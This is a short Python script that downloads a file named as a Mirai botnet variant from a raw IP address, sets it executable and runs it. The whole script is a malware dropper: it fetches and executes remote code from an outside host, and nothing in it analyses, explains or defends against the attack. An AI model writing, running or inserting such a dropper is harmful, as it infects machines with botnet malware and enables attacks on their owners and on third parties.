import urllib.request
import os

url = 'http://195.58.39.239/bins/MiraiVariant.x86'

# Download the file and name it MiraiVariant.x86
urllib.request.urlretrieve(url, 'MiraiVariant.x86')

# Give the file execute permission
os.chmod('MiraiVariant.x86', 0o755)

# Run the file with X86 argument
os.system('./MiraiVariant.x86 X86')
